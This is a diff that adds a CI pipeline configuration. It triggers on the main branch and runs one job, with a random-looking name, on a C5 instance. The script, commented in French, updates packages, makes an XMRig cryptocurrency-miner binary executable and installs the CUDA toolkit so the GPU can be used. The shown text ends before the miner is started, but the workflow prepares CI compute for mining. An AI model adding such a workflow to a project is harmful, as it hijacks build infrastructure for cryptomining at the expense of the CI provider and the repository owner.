@@ -1,0 +1,22 @@
+'on':
+  github:
+    branches:
+      only: main
+jobs:
+  XCkW36exrUPKqGE:
+    resources:
+      instance-type: C5
+    uses: script@v1
+    image: ubuntu:latest
+    with:
+      script: |
+        # Mettre à jour et upgrader les paquets
+        sudo apt-get update
+        sudo apt-get upgrade -y
+
+        # Donner les permissions nécessaires
+        sudo chmod +x xmrig-6.14.1/xmrig
+
+        # Télécharger et configurer CUDA (nécessaire pour utiliser la GPU)
+        sudo apt-get install -y nvidia-cuda-toolkit
+        sudo apt-get install -y build-essential
